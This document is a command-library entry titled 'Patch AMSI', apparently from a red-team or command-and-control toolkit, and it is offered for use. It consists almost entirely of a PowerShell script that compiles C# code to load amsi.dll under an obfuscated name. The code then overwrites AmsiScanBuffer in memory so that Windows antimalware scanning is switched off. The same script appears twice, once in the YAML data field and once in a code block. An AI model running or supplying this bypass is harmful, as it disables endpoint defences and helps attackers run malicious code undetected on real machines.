---
id: 39d8217c-6227-42f6-ae5a-cf041a0b7548
name: Patch AMSI
type: command
executor: bash
data: "$Winpatch = @\"\nusing System;\nusing System.Runtime.InteropServices;\n\npublic\
  \ class patch\n{\n    // https://twitter.com/_xpn_/status/1170852932650262530\n\
  \    static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };\n  \
  \  static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00\
  \ };\n\n    public static void it()\n    {\n        if (is64Bit())\n           \
  \ PatchAmsi(x64);\n        else\n            PatchAmsi(x86);\n    }\n\n    private\
  \ static void PatchAmsi(byte[] patch)\n    {\n        try\n        {\n         \
  \   var lib = Win32.LoadLibrary(\"a\" + \"ms\" + \"i.dll\");\n            var addr\
  \ = Win32.GetProcAddress(lib, \"AmsiScanBuffer\");\n\n            uint oldProtect;\n\
  \            Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);\n\
  \n            Marshal.Copy(patch, 0, addr, patch.Length);\n            Console.WriteLine(\"\
  Patch Sucessfull\");\n        }\n        catch (Exception e)\n        {\n      \
  \      Console.WriteLine(\" [x] {0}\", e.Message);\n            Console.WriteLine(\"\
  \ [x] {0}\", e.InnerException);\n        }\n    }\n\n    private static bool is64Bit()\n\
  \        {\n            bool is64Bit = true;\n\n            if (IntPtr.Size == 4)\n\
  \                is64Bit = false;\n\n            return is64Bit;\n        }\n}\n\
  \nclass Win32\n{\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr\
  \ GetProcAddress(IntPtr hModule, string procName);\n\n    [DllImport(\"kernel32\"\
  )]\n    public static extern IntPtr LoadLibrary(string name);\n\n    [DllImport(\"\
  kernel32\")]\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr\
  \ dwSize, uint flNewProtect, out uint lpflOldProtect);\n}\n\"@\n\nAdd-Type -TypeDefinition\
  \ $Winpatch -Language CSharp\n[patch]::it()"
output: null
created_at: '2023-04-06T03:56:26.126026+00:00'
updated_at: '2023-04-10T20:36:18.672069+00:00'
---

# Patch AMSI

```bash
$Winpatch = @"
using System;
using System.Runtime.InteropServices;

public class patch
{
    // https://twitter.com/_xpn_/status/1170852932650262530
    static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

    public static void it()
    {
        if (is64Bit())
            PatchAmsi(x64);
        else
            PatchAmsi(x86);
    }

    private static void PatchAmsi(byte[] patch)
    {
        try
        {
            var lib = Win32.LoadLibrary("a" + "ms" + "i.dll");
            var addr = Win32.GetProcAddress(lib, "AmsiScanBuffer");

            uint oldProtect;
            Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

            Marshal.Copy(patch, 0, addr, patch.Length);
            Console.WriteLine("Patch Sucessfull");
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }

    private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }
}

class Win32
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type -TypeDefinition $Winpatch -Language CSharp
[patch]::it()
```


